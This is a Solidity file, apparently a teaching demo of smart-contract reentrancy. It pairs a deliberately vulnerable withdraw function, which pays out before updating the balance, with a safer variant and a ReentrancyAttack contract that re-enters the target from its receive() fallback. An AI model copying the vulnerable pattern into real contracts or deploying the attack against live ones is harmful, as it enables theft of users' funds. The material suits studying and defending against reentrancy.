// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract Reentrance {
    mapping(address => int256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + int256(msg.value);
    }

    function balanceOf(address _who) public view returns (int256 balance) {
        return balances[_who];
    }

    function withdraw(int256 _amount) public {
        // 1. check
        if (balances[msg.sender] >= _amount) {
            // 2. interaction -> WRONG
            (bool result, ) = msg.sender.call{value: uint256(_amount)}(""); // 2 // 4
            if (result) {
                _amount;
            }

            // 3. effect
            balances[msg.sender] -= _amount; // 4 // 2 0 - 1 ether underfow
        }

        assert(balances[msg.sender] > 0);
    }

    function withdrawSafe(int256 _amount) public {
        // 1. check
        if (balances[msg.sender] >= _amount) {
            // 2. effect
            balances[msg.sender] -= _amount;

            // 3. interaction
            (bool result, ) = msg.sender.call{value: uint256(_amount)}(""); // 2 // 4
            if (result) {
                _amount;
            }
        }
    }

    receive() external payable {}
}

contract ReentrancyAttack {
    Reentrance public reentrance;
    int256 public amountToWithdraw;

    constructor(address payable _reentrance, int256 _amountToWithdraw) {
        reentrance = Reentrance(_reentrance);
        amountToWithdraw = _amountToWithdraw;
    }

    function attack() external {
        reentrance.withdrawSafe(amountToWithdraw); // 1
    }

    receive() external payable {
        // 3 // 5
        if (int256(address(reentrance).balance) >= amountToWithdraw) {
            // 3

            reentrance.withdrawSafe(amountToWithdraw);
        }
    }
}